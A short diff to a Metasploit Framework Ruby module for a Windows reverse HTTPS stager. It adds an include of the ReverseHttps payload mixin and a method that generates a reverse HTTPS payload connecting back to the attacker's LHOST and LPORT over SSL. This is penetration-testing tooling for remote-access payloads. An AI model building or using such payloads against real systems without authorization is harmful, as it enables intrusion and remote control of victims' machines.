@@ -6,12 +6,14 @@
 
 require 'msf/core'
 require 'msf/core/handler/reverse_https'
+require 'msf/core/payload/windows/reverse_https'
 
 
 module Metasploit3
 
   include Msf::Payload::Stager
   include Msf::Payload::Windows
+  include Msf::Payload::Windows::ReverseHttps
 
   def initialize(info = {})
     super(merge_info(info,
@@ -74,6 +76,15 @@ module Metasploit3
     u = "/" + generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW) + "\x00"
     p[i, u.length] = u
     p + datastore['LHOST'].to_s + "\x00"
+  end
+
+  def generate_wip
+    generate_reverse_https(
+      host: datastore['LHOST'],
+      port: datastore['LPORT'],
+      url:  "/" + generate_uri_checksum(Msf::Handler::ReverseHttps::URI_CHECKSUM_INITW),
+      ssl: true
+    )
   end
 
   #
